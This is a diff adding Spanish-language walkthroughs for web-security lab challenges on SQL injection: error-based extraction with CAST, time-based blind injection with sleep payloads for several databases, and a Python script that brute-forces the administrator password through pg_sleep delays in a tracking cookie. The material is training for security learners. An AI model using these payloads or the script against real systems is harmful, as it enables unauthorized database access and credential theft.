@@ -592,7 +592,194 @@ if __name__ == "__main__":
 ## Reto 13: Inyección SQL basada en errores visibles
 Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. No se devuelven los resultados de la consulta SQL.
 
-La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordPara resolver el laboratorio, encuentre una forma de filtrar la contraseña. administratorusuario, luego inicie sesión en su cuenta. 
+La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordPara resolver el laboratorio, encuentre una forma de filtrar la contraseña. administratorusuario, luego inicie sesión en su cuenta.
+
+Para resolverlo paso a paso:
+
+1º Provocar un error de sintaxis añadiendo un carácter de comilla comprobando que nos da un internal server error.
+
+```
+TrackingId=' order by 1-- -
+```
+
+2º Comentar el resto de la consulta para validarla sintácticamente.
+```
+TrackingId=' order by Null-- -
+```
+y probar localizando cadenas de texto, sin embargo vemos que no aparece
+
+```
+TrackingId=' order by 'test'-- -
+```
+
+3º Utilizar subconsultas SQL combinadas con ‘CAST‘ para extraer información. 
+```
+TrackingId=' or 1=cast((select 1) as INT)-- -
+```
+
+4º Ajustar la consulta para obtener solo una fila y evitar errores de tipo usando limit.
+```
+TrackingId=' or 1=cast((select username from users ) as INT)-- -
+```
+
+5º Filtrar primero el nombre de usuario del administrador y después su contraseña.
+```
+TrackingId=' or 1=cast((select username from users limit 1) as INT)-- -
+TrackingId=' or 1=cast((select password from users limit 1) as INT)-- -
+```
+
+## Reto 14: Inyección SQL ciega con retrasos de tiempo 
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
+
+Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de forma diferente si la consulta devuelve filas o genera un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retardos condicionales para inferir información.
+
+Para resolver el laboratorio, explote la vulnerabilidad de inyección SQL para provocar un retraso de 10 segundos. 
+
+1º El primer paso sería intentar comprobar que tipo de base de datos tiene por detrás
+
+```
+TrackingId=' order by 1-- -
+```
+
+2º Si no encotramos que tipo de de BD hay porque no nos muestra nada podemos ir probando para ver si con algún comando 
+podemos hacer el `delay`
+
+```
+Oracle	dbms_pipe.receive_message(('a'),10)
+Microsoft	WAITFOR DELAY '0:0:10'
+PostgreSQL	SELECT pg_sleep(10)
+MySQL	SELECT SLEEP(10)
+``` 
+
+para nuestro ejemplo podemos probar:
+
+```
+TrackingId=' and sleep(10)-- -
+```
+
+```
+TrackingId='|| pg_sleep(10)-- -
+```
+
+## Reto 15: Inyección SQL ciega con retrasos de tiempo y recuperación de información 
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
+
+Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de forma diferente si la consulta devuelve filas o genera un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retardos condicionales para inferir información.
+
+La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password Necesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.
+
+Para resolver el laboratorio, inicie sesión como administrator usuario. 
+
+1º Comprobar que BD nos encontramos, lo podemos hacer probando los ejemplos anteriores.
+
+2º Como hemos visto que la base de datos es posgresSQL podemos usar las sentencias de porque hemos  SELECT CASE WHEN(se hace la comparación) y se pone el delay de esta forma 
+podemos saber los caracteres de la contraseña.
+TrackingId=test'%3b SELECT CASE WHEN (username='administrator' and length(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- 
+
+
+un script para automatizar el proceso como los ejemplos anteriores puede ser esos:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import log
+from termcolor import colored
+import requests
+import signal
+import string
+import sys
+import time
+
+# Configuración general
+TARGET_URL = "https://0a04002104584715a44312a100f30080.web-security-academy.net"
+TRACKING_ID_BASE = "7a41yOgDxN6nlSXJ"
+SESSION_COOKIE = "fjEer6pflUWbcdNDpmhURW5O4YqwDCv6"
+USERNAME = "administrator"
+MAX_PASSWORD_LENGTH = 20
+CHARS = string.ascii_lowercase + string.digits
+DELAY_SECONDS = 5
+TIME_THRESHOLD = 4.5  # umbral para detectar si hubo retraso por pg_sleep
+
+# Manejo de Ctrl+C
+def def_handler(sig, frame):
+    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
+    p1.failure("Proceso detenido.")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Logging
+p1 = log.progress("SQL Injection")
+
+def makeSQLI():
+    p1.status("Iniciando ataque de fuerza bruta...")
+    time.sleep(1)
+
+    password = ""
+    p2 = log.progress("Contraseña descubierta")
+
+    for position in range(1, MAX_PASSWORD_LENGTH + 1):
+        found = False
+        for character in CHARS:
+            # Payload en texto plano
+            payload = (
+                f"{TRACKING_ID_BASE}'; SELECT CASE WHEN "
+                f"(username='{USERNAME}' AND substring(password,{position},1)='{character}') "
+                f"THEN pg_sleep({DELAY_SECONDS}) ELSE pg_sleep(0) END FROM users--"
+            )
+
+            # Codificar correctamente para la cookie
+            encoded_payload = requests.utils.quote(payload)
+
+            cookies = {
+                'TrackingId': encoded_payload,
+                'session': SESSION_COOKIE
+            }
+
+            start = time.time()
+            try:
+                requests.get(TARGET_URL, cookies=cookies, timeout=DELAY_SECONDS + 1)
+            except requests.exceptions.ReadTimeout:
+                # Timeout = delay confirmado
+                password += character
+                p2.status(password)
+                print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
+                found = True
+                break
+
+            end = time.time()
+            elapsed = end - start
+
+            if elapsed > TIME_THRESHOLD:
+                password += character
+                p2.status(password)
+                print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
+                found = True
+                break
+
+        if not found:
+            print(colored("[!] Fin del password o protegido por WAF", "yellow"))
+            break
+
+    return password
+
+if __name__ == "__main__":
+    print(colored("[*] Ataque iniciado...", "cyan"))
+    final_password = makeSQLI()
+    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))
+
+
+```
+
+En el caso de que fuera MySQL podemos probar alternativas en la sentencias porque no son la misma sintaxis:
+Algo equivalente sería:
+```
+select username from users where id='1' and if(substr((select password from users where username='administrator'),1,1)='a',sleep(5),sleep(0))-- -
+```
+
+
+
+
 
 
 ## ¿Qué es una SQLI ?
